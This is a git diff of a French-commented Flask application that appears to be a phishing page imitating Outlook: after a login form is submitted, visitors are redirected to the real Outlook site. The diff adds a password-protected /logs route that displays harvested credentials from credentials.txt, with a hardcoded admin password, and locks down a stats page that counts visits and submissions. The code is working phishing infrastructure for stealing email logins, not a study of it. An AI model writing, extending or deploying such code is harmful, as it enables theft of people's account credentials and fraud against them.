@@ -1,7 +1,10 @@
-﻿from flask import Flask, render_template, request, redirect
+﻿from flask import Flask, render_template, request, redirect, Response
 import os
 
 app = Flask(__name__)
+
+# Définition du mot de passe admin
+ADMIN_PASSWORD = "Saouda2025!!"
 
 # Variables pour stocker les statistiques
 total_visits = 0
@@ -32,9 +35,27 @@ def submit():
     # Redirige l'utilisateur vers le vrai site Outlook
     return redirect("https://outlook.live.com/")
 
-# Route pour afficher les statistiques
+# Route protégée pour afficher les identifiants
+@app.route("/logs")
+def logs():
+    auth = request.authorization
+    if not auth or auth.password != ADMIN_PASSWORD:
+        return Response("Accès refusé !", 401, {"WWW-Authenticate": 'Basic realm="Login Required"'})
+    
+    try:
+        with open("credentials.txt", "r") as file:
+            data = file.read().replace("\n", "<br>")
+        return f"<h1>Identifiants enregistrés :</h1><p>{data}</p>"
+    except FileNotFoundError:
+        return "<h1>Aucun identifiant enregistré pour l'instant.</h1>"
+
+# Route protégée pour afficher les statistiques
 @app.route("/stats")
 def stats():
+    auth = request.authorization
+    if not auth or auth.password != ADMIN_PASSWORD:
+        return Response("Accès refusé !", 401, {"WWW-Authenticate": 'Basic realm="Login Required"'})
+    
     return f"Nombre total de visites : {total_visits}<br>Nombre total de soumissions : {total_submissions}"
 
 # Lancer le serveur Flask
